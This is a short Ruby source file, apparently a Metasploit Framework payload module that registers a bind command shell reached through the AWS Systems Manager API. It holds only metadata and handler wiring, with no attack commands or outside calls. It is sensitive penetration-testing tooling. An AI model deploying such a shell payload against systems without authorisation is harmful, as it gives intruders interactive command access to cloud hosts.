##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 0

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Command Shell, Bind SSM (via AWS API)',
        'Description' => 'Creates an interactive shell using AWS SSM',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => MSF_LICENSE,
        'Platform' => '',
        'Arch' => ARCH_ALL,
        'Handler' => Msf::Handler::BindAwsSsm,
        'Session' => Msf::Sessions::AwsSsmCommandShellBind,
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  def on_session(session)
    super

    session.arch.clear  # undo the ARCH_ALL amalgamation
  end
end
